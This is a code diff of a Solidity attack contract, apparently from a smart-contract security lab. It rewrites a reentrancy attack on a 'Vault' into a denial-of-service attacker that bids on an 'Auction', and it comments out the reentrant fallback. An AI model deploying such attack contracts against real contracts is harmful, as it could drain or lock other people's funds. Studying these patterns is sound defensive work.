@@ -1,25 +1,23 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity 0.8.28;
-import {Vault} from "./VulnerableContract.sol";
+import {Auction} from "./VulnerableContract.sol";
 
-contract Attack {
-    Vault public vault;
+contract AttackDos {
+    Auction public auction;
 
-    constructor(address _vaultAddress) {
-        vault = Vault(_vaultAddress);
+    constructor(address _auctionAddress) {
+        auction = Auction(_auctionAddress);
     }
 
     // Fallback is called when Vault sends Ether to this contract.
-    fallback() external payable {
+    /*fallback() external payable {
         if (address(vault).balance >= 1 ether) {
             vault.redeem();
         }
-    }
+    }*/
 
     function attack() external payable {
-        require(msg.value >= 1 ether);
-        vault.store{value: 1 ether}();   
-        vault.redeem();
+        auction.bid{value: msg.value}();
     }
 
     // Helper function to check the balance of this contract
